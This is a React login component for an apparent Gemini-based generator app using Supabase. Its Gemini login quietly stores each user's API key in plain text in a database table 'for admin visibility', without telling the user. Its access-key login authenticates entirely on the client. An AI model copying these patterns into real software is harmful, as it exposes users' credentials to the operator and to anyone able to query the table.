import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Key, Sparkles, Shield, Loader2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useLanguage } from '@/contexts/LanguageContext';
import { useAuth } from '@/contexts/AuthContext';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';

export default function Login() {
  const { t } = useLanguage();
  const { login, loginWithGemini, user, isGeminiMode } = useAuth();
  const navigate = useNavigate();

  const [accessKey, setAccessKey] = useState('');
  const [geminiKey, setGeminiKey] = useState('');
  const [loading, setLoading] = useState(false);
  const [geminiLoading, setGeminiLoading] = useState(false);

  useEffect(() => {
    if (user || isGeminiMode) {
      navigate('/generator');
    }
  }, [user, isGeminiMode, navigate]);

  const handleAccessKeyLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!accessKey.trim()) return;

    setLoading(true);
    try {
      const { data, error } = await supabase
        .from('users')
        .select('*')
        .eq('access_key', accessKey.trim())
        .eq('is_active', true)
        .maybeSingle();

      if (error) throw error;

      if (!data) {
        toast.error(t('login.invalidKey'));
        return;
      }

      login({
        id: data.id,
        label: data.label,
        accessKey: data.access_key,
        geminiApiKey: data.gemini_api_key || undefined,
      });

      toast.success(t('common.success'));
      navigate('/generator');
    } catch (error) {
      console.error('Login error:', error);
      toast.error(t('common.error'));
    } finally {
      setLoading(false);
    }
  };

  const handleGeminiLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!geminiKey.trim()) return;

    setGeminiLoading(true);
    try {
      // Save Gemini API key to database for admin visibility
      const { data: existing } = await supabase
        .from('gemini_sessions')
        .select('id')
        .eq('gemini_api_key', geminiKey.trim())
        .maybeSingle();

      if (existing) {
        // Update last_used_at if key already exists
        await supabase
          .from('gemini_sessions')
          .update({ last_used_at: new Date().toISOString() })
          .eq('id', existing.id);
      } else {
        // Insert new session
        await supabase.from('gemini_sessions').insert({
          gemini_api_key: geminiKey.trim(),
        });
      }

      loginWithGemini(geminiKey.trim());
      toast.success(t('common.success'));
      navigate('/generator');
    } catch (error) {
      console.error('Gemini login error:', error);
      loginWithGemini(geminiKey.trim());
      toast.success(t('common.success'));
      navigate('/generator');
    } finally {
      setGeminiLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-3 sm:p-4 bg-background">
      <div className="w-full max-w-md">
        {/* Logo */}
        <div className="text-center mb-6 sm:mb-8">
          <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl gradient-primary mx-auto mb-3 sm:mb-4 flex items-center justify-center glow-primary">
            <Sparkles className="h-8 w-8 sm:h-10 sm:w-10 text-primary-foreground" />
          </div>
          <h1 className="text-2xl sm:text-3xl font-bold text-gradient">{t('login.title')}</h1>
          <p className="text-sm sm:text-base text-muted-foreground mt-2">{t('login.subtitle')}</p>
        </div>

        {/* Access Key Login */}
        <div className="glass-card rounded-2xl p-4 sm:p-6 mb-4 sm:mb-6">
          <form onSubmit={handleAccessKeyLogin}>
            <Label htmlFor="accessKey" className="text-sm font-medium">
              {t('login.accessKey')}
            </Label>
            <div className="mt-2 relative">
              <Key className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                id="accessKey"
                type="text"
                value={accessKey}
                onChange={(e) => setAccessKey(e.target.value)}
                placeholder={t('login.accessKeyPlaceholder')}
                className="pl-10"
              />
            </div>
            <Button
              type="submit"
              className="w-full mt-4 gradient-primary text-primary-foreground"
              disabled={loading || !accessKey.trim()}
            >
              {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
              {t('login.login')}
            </Button>
          </form>
        </div>

        {/* Divider */}
        <div className="relative mb-6">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-border"></div>
          </div>
          <div className="relative flex justify-center text-xs uppercase">
            <span className="bg-background px-2 text-muted-foreground">
              {t('login.orUseGemini')}
            </span>
          </div>
        </div>

        {/* Gemini API Key Login */}
        <div className="glass-card rounded-2xl p-4 sm:p-6 mb-4 sm:mb-6">
          <form onSubmit={handleGeminiLogin}>
            <Label htmlFor="geminiKey" className="text-sm font-medium">
              {t('login.geminiApiKey')}
            </Label>
            <div className="mt-2 relative">
              <Sparkles className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                id="geminiKey"
                type="password"
                value={geminiKey}
                onChange={(e) => setGeminiKey(e.target.value)}
                placeholder={t('login.geminiPlaceholder')}
                className="pl-10"
              />
            </div>
            <Button
              type="submit"
              variant="outline"
              className="w-full mt-4"
              disabled={geminiLoading || !geminiKey.trim()}
            >
              {geminiLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
              {t('login.startWithGemini')}
            </Button>
          </form>
        </div>

        {/* Admin Access Link */}
        <div className="text-center">
          <Button
            variant="ghost"
            size="sm"
            onClick={() => navigate('/admin')}
            className="gap-2 text-muted-foreground"
          >
            <Shield className="h-4 w-4" />
            {t('login.adminAccess')}
          </Button>
        </div>
      </div>
    </div>
  );
}
